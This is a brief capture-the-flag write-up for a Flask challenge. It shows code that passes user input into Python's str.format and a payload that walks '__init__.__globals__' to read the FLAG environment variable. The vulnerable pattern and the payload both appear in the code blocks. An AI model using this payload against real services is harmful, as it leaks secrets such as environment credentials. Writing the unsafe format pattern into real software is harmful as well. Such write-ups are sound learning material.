![image](https://github.com/user-attachments/assets/8edf7e20-fb1d-48a5-b71b-81121477bf65)

# Credit
Credits to [@Baba is dead](https://github.com/Zhongbob) for teaching me on this challenge

# Solution
the vulnerability lies in these lines it uses str.format will could lead to leakage of data.

```
def generate_response(response, command):
    responseObj = RandomResponse(response)
    message = "{response.generated} but "+command+"."
    return message.format(response = responseObj)
```

More info: https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/

Therefore, we can craft some payload to leak the flag

```
yes {response.__init__.__globals__[os].environ[FLAG]}
```

We need 'yes' in front the program checks for the prefix.

```
command_responses = {
    "yes": "but no, but yes, ",
    "no": "but yes, but no, ",
    "but": "but but, ",
}

@app.route('/api', methods=['POST'])
def api():

    session.setdefault('uuid', str(uuid.uuid4()))
    data = request.get_json()
    command = data.get('command')
    prefix = command.split(" ")[0].lower()

    if prefix not in command_responses:
        return jsonify({"response": "Invalid Command", "status": 400})
    
    response = generate_response(command_responses[prefix], command)

```

![image](https://github.com/user-attachments/assets/ec1e914c-09b1-458e-82ee-3230b6ad7fc0)
